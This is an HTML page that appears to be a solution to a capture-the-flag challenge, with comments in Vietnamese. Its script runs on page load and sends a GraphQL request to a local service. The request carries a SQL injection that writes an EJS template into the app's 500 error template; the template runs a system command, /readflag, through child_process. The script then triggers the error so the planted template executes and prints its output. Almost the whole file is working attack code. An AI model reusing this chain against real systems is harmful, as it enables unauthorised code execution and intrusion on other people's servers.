<!DOCTYPE html>
<html>
<body>
    <h1>CTF Exploit Output</h1>
    <div id="log">Running...</div>
    <script>
        // --- CẤU HÌNH ---
        // 1. Thay token này bằng Admin Token bạn tạo được (sau khi chạy Step 1 của Python)
        const ADMIN_TOKEN = "THAY_TOKEN_ADMIN_VAO_DAY"; 
        
        // 2. Port nội bộ (thường trùng với port bài thi bên ngoài: 42744)
        const PORT = 42744; 
        
        const TARGET = `http://127.0.0.1:${PORT}/graphql?token=${ADMIN_TOKEN}`;

        // --- PAYLOAD ---
        // Mã độc EJS: Chạy /readflag và in kết quả
        const EJS_SHELL = `<% 
            try { 
                const r = require('child_process').execSync('/readflag').toString(); 
                %><%= r %><% 
            } catch(e) { 
                %><%= e.message %><% 
            } 
        %>`;

        // SQL Injection: Bypass filter bằng \n, ghi EJS vào file template lỗi 500
        // Cấu trúc bảng users: id, name, department, isPresent (4 cột)
        const SQL_INJECT = `\n' UNION SELECT 1, '${EJS_SHELL}', 'hacker', 1 INTO OUTFILE '/app/views/errors/500.ejs' -- -`;

        // Query 1: Ghi file
        const q1 = { "query": `query { getDataByName(name: "${SQL_INJECT}") { name } }` };
        
        // Query 2: Kích hoạt lỗi (render file 500.ejs)
        const q2 = { "query": `query { getDataByName(name: "'") { name } }` };

        const log = (msg) => {
            document.getElementById('log').innerHTML += "<br>" + msg;
            document.body.innerHTML += "<br><pre>" + msg + "</pre>"; // In ra để PDF chụp lại
        };

        async function pwn() {
            try {
                log("[1] Sending SQL Injection to write shell...");
                await fetch(TARGET, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(q1)
                });

                // Chờ file system sync
                await new Promise(r => setTimeout(r, 1500));

                log("[2] Triggering Error to execute shell...");
                let res = await fetch(TARGET, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(q2)
                });

                let text = await res.text();
                log("--- RESULT ---");
                log(text); // Flag sẽ hiện ở đây
            } catch (e) {
                log("Error: " + e);
            }
        }

        pwn();
    </script>
</body>
</html>
